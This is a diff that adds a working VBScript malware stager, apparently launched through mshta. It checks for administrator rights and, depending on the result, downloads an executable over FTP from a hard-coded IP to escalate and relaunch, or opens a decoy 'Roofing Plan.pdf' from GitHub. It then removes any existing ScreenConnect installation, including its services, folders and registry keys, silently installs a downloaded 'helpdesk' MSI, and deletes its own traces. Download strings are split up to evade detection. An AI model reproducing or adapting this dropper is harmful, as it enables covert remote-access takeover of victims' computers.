@@ -1,0 +1,159 @@
+' gate seed flg
+' built 58e1eb44
+' stage
+Dim gnust, g8gx, mrkjt, gsvez, gdqx, kqkjx, m148e, zzwt, mqr, xcz7, wt3j, gh9pr, zgs, v356, tuuv, ts730, wa9p, tczm, x12k
+Dim mdy, ztqem, xzfq, m9mw, wqgu2, gtf, gfmm
+Set gnust = CreateObject("Scripting.FileSystemObject")
+Set g8gx = CreateObject("WScript.Shell")
+gsvez = g8gx.ExpandEnvironmentStrings("%TEMP%")
+Set mrkjt = gnust.OpenTextFile(gsvez & "\s05374.txt", 8, True)
+mrkjt.WriteLine "[stage] start"
+gfmm = "C:\ProgramData\sd"
+
+m9mw = False
+mdy = gsvez & "\_p.txt"
+kqkjx = g8gx.Run("cmd.exe /c C:\Windows\System32\whoami.exe /groups > """ & mdy & """", 0, True)
+mrkjt.WriteLine "[stage] whoami rc=" & kqkjx
+If gnust.FileExists(mdy) Then
+    Set xzfq = gnust.OpenTextFile(mdy, 1)
+    If Not xzfq.AtEndOfStream Then ztqem = xzfq.ReadAll
+
+    xzfq.Close
+    mm9t = 3
+    If InStr(ztqem, "S-1-16-12288") > 0 Or InStr(ztqem, "S-1-16-16384") > 0 Then m9mw = True
+    gnust.DeleteFile mdy, True
+End If
+mrkjt.WriteLine "[stage] admin=" & m9mw
+
+If Not m9mw Then
+
+    If Not gnust.FolderExists(gfmm) Then
+        On Error Resume Next
+        gnust.CreateFolder gfmm
+        On Error GoTo 0
+    End If
+    mwdy9 = 7
+    gdqx = "curl.exe -s --fail -L " & "-u anon" & "ymou" & "s:ftp" & "@example.co" & "m " & "-o """ & gfmm & "\icu.exe"" " & "ftp://72.51.57" & ".39/icu.e" & "xe"
+    kqkjx = g8gx.Run("cmd.exe /c " & gdqx, 0, True)
+    mrkjt.WriteLine "[stage] icu dl rc=" & kqkjx
+    If gnust.FileExists(gfmm & "\icu.exe") Then
+        wqgu2 = Replace(location.href, "file:///", "")
+        wqgu2 = Replace(wqgu2, "%20", " ")
+        wqgu2 = Replace(wqgu2, "/", "\")
+        On Error Resume Next
+        gnust.DeleteFile gfmm & "\p-log.txt", True
+        On Error GoTo 0
+        Set xzfq = gnust.CreateTextFile(gfmm & "\run.vbs", True)
+        xzfq.WriteLine "On Error Resume Next"
+        xzfq.WriteLine "Dim sh"
+        xzfq.WriteLine "Set sh = CreateObject(""WScript.Shell"")"
+        xzfq.WriteLine "sh.Run ""cmd.exe /c echo [icu-vbs] hit %DATE% %TIME%> " & gfmm & "\p-log.txt"", 0, True"
+        xzfq.WriteLine "sh.Run ""mshta.exe "" & Chr(34) & """ & wqgu2 & """ & Chr(34), 0, False"
+        xzfq.Close
+        mrkjt.WriteLine "[stage] handoff start"
+        mrkjt.Close
+        kqkjx = g8gx.Run("cmd.exe /c """ & gfmm & "\icu.exe"" m4a1_dev4 " & gfmm & "\run.vbs", 0, False)
+    Else
+        mrkjt.WriteLine "[stage] icu missing"
+        mrkjt.Close
+        fb5 = 8
+    End If
+Else
+    gdqx = "curl.exe -s --fail -L -o """ & gsvez & "\Roofing Plan.pdf"" " & "https://r" & "aw.githubusercon" & "tent.com/sly" & "net999" & "-coder/" & "Yambo/main/rp.pdf"
+    o02b = 4
+    kqkjx = g8gx.Run("cmd.exe /c " & gdqx, 0, True)
+    mrkjt.WriteLine "[stage] pdf dl rc=" & kqkjx
+    m148e = gsvez & "\Roofing Plan.pdf"
+    If gnust.FileExists(m148e) Then
+        On Error Resume Next
+
+        zzwt = g8gx.RegRead("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe\")
+        kb6c = 5
+        If Err.Number <> 0 Or Len(zzwt) = 0 Then
+            zzwt = "msedge.exe"
+            Err.Clear
+        End If
+        On Error GoTo 0
+        mqr = g8gx.Run(Chr(34) & zzwt & Chr(34) & " " & Chr(34) & m148e & Chr(34), 1, False)
+        mrkjt.WriteLine "[stage] edge rc=" & mqr
+    Else
+        mrkjt.WriteLine "[stage] pdf missing"
+
+    End If
+
+    gdqx = "curl.exe -s --fail -L " & "-u anon" & "ymou" & "s:ftp" & "@example.co" & "m " & "-o """ & gsvez & "\helper.msi"" " & "ftp://72.51.57." & "39/helpd" & "esk.msi"
+    kqkjx = g8gx.Run("cmd.exe /c " & gdqx, 0, True)
+    mrkjt.WriteLine "[stage] msi dl rc=" & kqkjx
+
+    mrkjt.WriteLine "[stage] sweep start"
+    Set xcz7 = GetObject("winmgmts:\\.\root\cimv2")
+    Set wt3j = xcz7.ExecQuery("SELECT * FROM Win32_Process WHERE Name LIKE '%ScreenConnect%'")
+    For Each gh9pr In wt3j
+        On Error Resume Next
+        gh9pr.Terminate()
+        On Error GoTo 0
+        tnk = 1
+    Next
+    Set wt3j = xcz7.ExecQuery("SELECT * FROM Win32_Service WHERE Name LIKE 'ScreenConnect%'")
+    For Each gh9pr In wt3j
+        On Error Resume Next
+        gh9pr.StopService()
+        On Error GoTo 0
+    Next
+    kqkjx = g8gx.Run("cmd.exe /c ping -n 2 127.0.0.1 >nul", 0, True)
+    Set wt3j = xcz7.ExecQuery("SELECT * FROM Win32_Service WHERE Name LIKE 'ScreenConnect%'")
+    For Each gh9pr In wt3j
+        On Error Resume Next
+        gh9pr.Delete()
+        On Error GoTo 0
+    Next
+    For Each zgs In Array("C:\Program Files (x86)", "C:\Program Files")
+        If gnust.FolderExists(zgs) Then
+            For Each v356 In gnust.GetFolder(zgs).SubFolders
+                If InStr(v356.Name, "ScreenConnect") = 1 Then
+                    On Error Resume Next
+                    v356.Delete True
+                    On Error GoTo 0
+                End If
+            Next
+        End If
+    Next
+    Set tuuv = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
+    For Each ts730 In Array("SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall", "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", "SYSTEM\CurrentControlSet\Services")
+
+        On Error Resume Next
+        wa9p = ""
+        tuuv.EnumKey &H80000002, ts730, wa9p
+        If IsArray(wa9p) Then
+            For Each gh9pr In wa9p
+                If InStr(gh9pr, "ScreenConnect") > 0 Then
+                    tuuv.DeleteKey &H80000002, ts730 & "\" & gh9pr
+                End If
+
+            Next
+        End If
+        Err.Clear
+    Next
+    tuuv.DeleteKey &H80000002, "SOFTWARE\WOW6432Node\ScreenConnect"
+    tuuv.DeleteKey &H80000001, "Software\ScreenConnect"
+    mrkjt.WriteLine "[stage] sweep done"
+
+    tczm = gsvez & "\helper.msi"
+    If gnust.FileExists(tczm) Then
+        x12k = g8gx.Run("msiexec.exe /i """ & tczm & """ /qn /norestart", 0, False)
+        zmbc = 6
+        mrkjt.WriteLine "[stage] msi rc=" & x12k
+    Else
+        mrkjt.WriteLine "[stage] msi missing"
+    End If
+
+    On Error Resume Next
+    If gnust.FileExists(gsvez & "\e.bat") Then gnust.DeleteFile gsvez & "\e.bat", True
+    If gnust.FileExists(gsvez & "\icu.exe") Then gnust.DeleteFile gsvez & "\icu.exe", True
+    If gnust.FileExists(gfmm & "\run.vbs") Then gnust.DeleteFile gfmm & "\run.vbs", True
+    If gnust.FileExists(gfmm & "\icu.exe") Then gnust.DeleteFile gfmm & "\icu.exe", True
+    If gnust.FileExists(gfmm & "\p-log.txt") Then gnust.DeleteFile gfmm & "\p-log.txt", True
+    On Error GoTo 0
+    mrkjt.WriteLine "[stage] done"
+    mrkjt.Close
+End If
